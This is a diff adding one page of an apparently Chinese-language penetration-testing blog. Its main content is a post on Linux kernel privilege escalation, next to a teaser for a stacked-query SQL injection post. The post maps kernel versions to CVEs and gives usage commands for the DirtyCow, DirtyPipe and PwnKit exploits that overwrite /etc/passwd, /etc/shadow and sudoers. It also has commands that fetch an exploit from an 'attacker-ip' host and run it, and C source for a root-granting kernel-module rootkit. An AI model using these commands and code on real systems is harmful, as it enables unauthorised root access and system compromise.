@@ -1,0 +1,1811 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+<meta property="og:type" content="website">
+<meta property="og:title" content="渗透测试实战记录">
+<meta property="og:url" content="https://congliang.github.io/page/12/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="渗透测试,靶机,Writeup,安全笔记,SRC,提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/page/12/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/12/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">渗透测试实战记录</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-stacked-queries/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-stacked-queries/" class="post-title-link" itemprop="url">SQL 注入：堆叠查询注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-15T08:00:00+08:00">2024-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>堆叠查询用分号分隔多条 SQL 语句，在支持多语句执行的环境中能实现增删改、写入 Webshell、甚至直接执行系统命令——一次注入完成完整攻击链。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SQL-injection-stacked-queries/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Linux-privesc-kernel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Linux-privesc-kernel/" class="post-title-link" itemprop="url">Linux提权：内核漏洞利用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-01T08:00:00+08:00">2024-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Linux渗透测试中，拿到低权限shell后的首要目标就是提升至root。内核漏洞利用是最具技术含量的提权路径之一。本文梳理了Linux内核提权的核心技术栈：从信息收集到CVE映射、从经典漏洞复现到exploit搜索与编译、以及内核模块攻击等，附完整代码示例与操作细节。</p>
+<hr>
+<h2 id="一、信息收集：uname-a-与内核版本"><a href="#一、信息收集：uname-a-与内核版本" class="headerlink" title="一、信息收集：uname -a 与内核版本"></a>一、信息收集：uname -a 与内核版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux target 4.15.0-142-generic #146-Ubuntu SMP ... x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -r          <span class="comment"># 4.15.0-142-generic</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="built_in">cat</span> /etc/os-release</span><br></pre></td></tr></table></figure>
+
+<p>版本号解析（以 <code>4.15.0-142-generic</code> 为例）：</p>
+<ul>
+<li>4 — 主版本号 &#x2F; 15 — 次版本号 &#x2F; 0 — 补丁级别</li>
+<li>142 — 发行版补丁号 &#x2F; generic — 内核变体（generic&#x2F;server&#x2F;aws&#x2F;kvm）</li>
+</ul>
+<hr>
+<h2 id="二、内核版本与CVE速查映射表"><a href="#二、内核版本与CVE速查映射表" class="headerlink" title="二、内核版本与CVE速查映射表"></a>二、内核版本与CVE速查映射表</h2><table>
+<thead>
+<tr>
+<th>内核版本范围</th>
+<th>可利用CVE</th>
+<th>类型</th>
+<th>难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2.6.22 - 3.9</td>
+<td>CVE-2013-2094 (perf_swevent)</td>
+<td>任意写</td>
+<td>低</td>
+</tr>
+<tr>
+<td>2.6.31 - 3.13</td>
+<td>CVE-2014-0038 (recvmmsg)</td>
+<td>内存越界</td>
+<td>低</td>
+</tr>
+<tr>
+<td>2.6.37 - 3.8.9</td>
+<td>CVE-2012-0056 (mempodipper)</td>
+<td>权限绕过</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>3.13 - 4.8.3</td>
+<td>CVE-2016-5195 (DirtyCow)</td>
+<td>条件竞争</td>
+<td>中</td>
+</tr>
+<tr>
+<td>3.14 - 4.15</td>
+<td>CVE-2017-1000112 (UFO)</td>
+<td>堆溢出</td>
+<td>中</td>
+</tr>
+<tr>
+<td>4.4 - 4.14</td>
+<td>CVE-2017-16995 (eBPF验证器)</td>
+<td>验证器缺陷</td>
+<td>中</td>
+</tr>
+<tr>
+<td>2.6.0 - 5.8</td>
+<td>CVE-2021-4034 (PwnKit)</td>
+<td>越界写</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>5.8 - 5.16.11</td>
+<td>CVE-2022-0847 (DirtyPipe)</td>
+<td>flags未清理</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>5.11 - 6.2</td>
+<td>CVE-2023-0386 (OverlayFS)</td>
+<td>权限绕过</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<p>在线资源：<a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/">Linux Kernel CVEs</a>、<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit-DB</a>、<a target="_blank" rel="noopener" href="https://nvd.nist.gov/">NVD</a>。</p>
+<hr>
+<h2 id="三、DirtyCow：CVE-2016-5195"><a href="#三、DirtyCow：CVE-2016-5195" class="headerlink" title="三、DirtyCow：CVE-2016-5195"></a>三、DirtyCow：CVE-2016-5195</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>DirtyCow是内核内存管理子系统中潜伏9年的条件竞争漏洞。内核的写时复制（COW）机制处理私有只读映射时存在竞态窗口——攻击者可在COW写入前替换目标页，绕过只读限制向任意文件写入。</p>
+<ul>
+<li><strong>影响范围</strong>: 2.6.22 (2007) 至 4.8.3 (2016)</li>
+<li><strong>利用效果</strong>: 任意文件覆写（&#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;shadow、SUID二进制等）</li>
+</ul>
+<h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h3><p><code>mm/gup.c</code> 中 <code>__get_user_pages()</code> 处理 <code>FOLL_FORCE</code> 标志时强制获取COW后的写权限，但未正确校验页面只读属性。攻击线程用 <code>madvise(MADV_DONTNEED)</code> 释放目标页缓存，同时写入线程向目标写入数据。两个操作交错执行时COW检查被绕过，写入直接作用于原始只读内存页并同步到磁盘。</p>
+<h3 id="Exploit使用"><a href="#Exploit使用" class="headerlink" title="Exploit使用"></a>Exploit使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line"><span class="comment"># 覆写 /etc/passwd 添加root用户</span></span><br><span class="line">./dirtyc0w /etc/passwd <span class="string">&quot;<span class="subst">$(echo &#x27;r00t:advwtv/xX,0:0:root:/root:/bin/bash&#x27;)</span>&quot;</span></span><br><span class="line"><span class="comment"># 覆写 /etc/sudoers 免密配置</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;username ALL=(ALL) NOPASSWD: ALL&#x27;</span> | ./dirtyc0w /etc/sudoers -</span><br></pre></td></tr></table></figure>
+
+<p>注意事项：RHEL&#x2F;CentOS可能后向补丁免疫；exploit可能需要多次尝试；写入内容不能超过文件原有长度；部分内核加固可能使PoC失效。</p>
+<hr>
+<h2 id="四、DirtyPipe：CVE-2022-0847"><a href="#四、DirtyPipe：CVE-2022-0847" class="headerlink" title="四、DirtyPipe：CVE-2022-0847"></a>四、DirtyPipe：CVE-2022-0847</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>DirtyPipe由Max Kellermann在2022年发现，因效果类似DirtyCow而得名”脏管”。漏洞允许无写权限的用户向任意只读文件写入数据，影响范围涵盖服务器、Android、容器等。</p>
+<ul>
+<li><strong>影响范围</strong>: 5.8 至 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 之前</li>
+<li><strong>利用效果</strong>: 任意只读文件覆写</li>
+</ul>
+<h3 id="核心原理-1"><a href="#核心原理-1" class="headerlink" title="核心原理"></a>核心原理</h3><p>管道缓冲区 <code>pipe_buffer.flags</code> 中的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志控制新数据能否追加到现有页末尾。<code>splice()</code> 将文件数据转移到管道时不会清除该标志——前一次管道操作设置的标志会被错误继承。随后 <code>write()</code> 向管道写入的数据会合并到文件页面缓存中，从而在无写权限的情况下修改磁盘文件。</p>
+<h3 id="Exploit使用-1"><a href="#Exploit使用-1" class="headerlink" title="Exploit使用"></a>Exploit使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c &amp;&amp; gcc dirtypipez.c -o dirtypipez</span><br><span class="line">./dirtypipez /etc/passwd 1 <span class="string">&quot;evil::0:0::/root:/bin/bash&quot;</span>    <span class="comment"># 覆写passwd</span></span><br><span class="line">./dirtypipez /etc/shadow 1 <span class="string">&quot;root::19090:0:99999:7:::&quot;</span>      <span class="comment"># 清空root密码</span></span><br><span class="line">./dirtypipez /host/etc/passwd 1 <span class="string">&quot;attacker::0:0::/root:/bin/bash&quot;</span>  <span class="comment"># 容器逃逸</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、PwnKit：CVE-2021-4034"><a href="#五、PwnKit：CVE-2021-4034" class="headerlink" title="五、PwnKit：CVE-2021-4034"></a>五、PwnKit：CVE-2021-4034</h2><h3 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>PwnKit是polkit的pkexec组件中潜伏12年的提权漏洞，由Qualys于2021年底披露。pkexec是SUID-root二进制文件，几乎所有安装了polkit的Linux发行版默认存在。</p>
+<ul>
+<li><strong>影响范围</strong>: pkexec自2009年首次commit以来的所有版本</li>
+<li><strong>利用效果</strong>: 任何本地用户立即可获root权限</li>
+</ul>
+<h3 id="核心原理-2"><a href="#核心原理-2" class="headerlink" title="核心原理"></a>核心原理</h3><p>当argc为0调用pkexec时，程序越界访问 <code>argv[0]</code> 和 <code>argv[1]</code>，实际读取的值由环境变量在内存中的排布决定。通过精心构造环境变量，<code>argv[1]</code> 可指向攻击者控制的路径，最终让pkexec以root权限加载恶意共享库执行任意代码。</p>
+<h3 id="Exploit使用-2"><a href="#Exploit使用-2" class="headerlink" title="Exploit使用"></a>Exploit使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /usr/bin/pkexec                          <span class="comment"># 确认SUID: -rwsr-xr-x</span></span><br><span class="line">wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c</span><br><span class="line">gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry</span><br><span class="line">./PwnKit                                        <span class="comment"># id → uid=0(root)</span></span><br><span class="line"><span class="built_in">chmod</span> 0755 /usr/bin/pkexec                      <span class="comment"># 临时防御：移除SUID</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击路径：<code>低权限用户 → 特殊环境变量 → pkexec(SUID) → 越界访问 → 加载恶意.so → root shell</code></p>
+<hr>
+<h2 id="六、searchsploit-搜索内核Exploit"><a href="#六、searchsploit-搜索内核Exploit" class="headerlink" title="六、searchsploit 搜索内核Exploit"></a>六、searchsploit 搜索内核Exploit</h2><p><code>searchsploit</code> 是Exploit-DB的离线搜索工具，Kali默认安装，适用于无法联网的环境。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -u                              <span class="comment"># 更新数据库</span></span><br><span class="line">searchsploit linux kernel 4.15 --colour      <span class="comment"># 按版本搜索</span></span><br><span class="line">searchsploit --cve 2022-0847                 <span class="comment"># 按CVE搜索</span></span><br><span class="line">searchsploit -m 40611                        <span class="comment"># 复制到当前目录</span></span><br><span class="line">searchsploit -x 40611                        <span class="comment"># 终端查看</span></span><br><span class="line"><span class="comment"># 基于uname自动搜索</span></span><br><span class="line"><span class="built_in">uname</span> -r | xargs -I &#123;&#125; searchsploit <span class="string">&quot;linux kernel &#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合Metasploit：<code>msfconsole</code> → <code>search linux/local/kernel</code> → <code>use exploit/linux/local/cve_2022_0847_dirtypipe</code>。</p>
+<hr>
+<h2 id="七、在目标主机上编译Exploit"><a href="#七、在目标主机上编译Exploit" class="headerlink" title="七、在目标主机上编译Exploit"></a>七、在目标主机上编译Exploit</h2><p>生产环境通常没有开发工具链，编译exploit需多种策略。</p>
+<h3 id="常见问题与方案"><a href="#常见问题与方案" class="headerlink" title="常见问题与方案"></a>常见问题与方案</h3><p><strong>问题1：gcc不存在</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -static exploit.c -o exploit_static -lpthread   <span class="comment"># 方案A: 本地静态编译（推荐）</span></span><br><span class="line"><span class="built_in">which</span> tcc &amp;&amp; tcc exploit.c -o exploit                <span class="comment"># 方案B: TinyCC轻量编译器</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>问题2：glibc版本不匹配</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -static exploit.c -o exploit_static      <span class="comment"># 静态链接避免glibc依赖</span></span><br><span class="line">musl-gcc -static exploit.c -o exploit_static <span class="comment"># musl更彻底的静态链接</span></span><br><span class="line">ldd exploit_static                           <span class="comment"># 验证: &quot;not a dynamic executable&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>问题3：架构不匹配（32位&#x2F;64位&#x2F;ARM）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m                                      <span class="comment"># 确认目标架构</span></span><br><span class="line">gcc -m32 exploit.c -o exploit_32             <span class="comment"># 64位机编译32位</span></span><br><span class="line">aarch64-linux-gnu-gcc -static exploit.c -o exploit_arm64</span><br><span class="line">docker run --<span class="built_in">rm</span> -v $(<span class="built_in">pwd</span>):/wrk ubuntu:16.04 \</span><br><span class="line">    bash -c <span class="string">&quot;cd /wrk &amp;&amp; gcc -static exploit.c -o exploit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="从远程传输Exploit到目标"><a href="#从远程传输Exploit到目标" class="headerlink" title="从远程传输Exploit到目标"></a>从远程传输Exploit到目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://attacker-ip/exploit -O /tmp/exploit</span><br><span class="line">curl http://attacker-ip/exploit -o /tmp/exploit</span><br><span class="line">python3 -c <span class="string">&quot;import urllib.request; urllib.request.urlretrieve(&#x27;http://attacker-ip/exploit&#x27;, &#x27;/tmp/exploit&#x27;)&quot;</span></span><br><span class="line">nc attacker-ip 4444 &lt; /tmp/exploit_if_needed  <span class="comment"># netcat传输</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/exploit &amp;&amp; /tmp/exploit</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、内核模块（LKM）攻击"><a href="#八、内核模块（LKM）攻击" class="headerlink" title="八、内核模块（LKM）攻击"></a>八、内核模块（LKM）攻击</h2><p>如果攻击者能加载恶意内核模块，便可获得ring0级别控制权，超越root权限。</p>
+<h3 id="恶意LKM示例"><a href="#恶意LKM示例" class="headerlink" title="恶意LKM示例"></a>恶意LKM示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rootkit.c — 加载即提权到root</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> prepare_creds();</span><br><span class="line">    <span class="keyword">if</span> (!new) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    new-&gt;uid.val = new-&gt;euid.val = <span class="number">0</span>;</span><br><span class="line">    new-&gt;gid.val = new-&gt;egid.val = <span class="number">0</span>;</span><br><span class="line">    new-&gt;suid.val = new-&gt;sgid.val = <span class="number">0</span>;</span><br><span class="line">    new-&gt;fsuid.val = new-&gt;fsgid.val = <span class="number">0</span>;</span><br><span class="line">    commit_creds(new);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[+] Credentials set to root\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">rootkit_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Makefile：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line">KDIR := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+
